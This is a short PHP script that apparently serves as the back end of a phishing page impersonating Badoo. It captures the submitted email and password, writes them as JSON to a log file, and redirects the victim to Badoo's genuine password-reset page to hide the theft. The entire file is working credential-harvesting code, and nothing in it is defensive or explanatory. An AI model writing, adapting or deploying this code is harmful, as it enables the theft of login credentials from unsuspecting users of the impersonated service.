<?php

header('Location: https://badoo.com/forgot/');
$data = array('site' => 'Badoo',
  'user' => $_POST['email'],
  'pass' => $_POST['password']);

  $json_data = json_encode($data);

  $f = fopen('../../../logs/info.txt', 'w+');
  fwrite($f, $json_data);
  fclose($f);
exit();
?>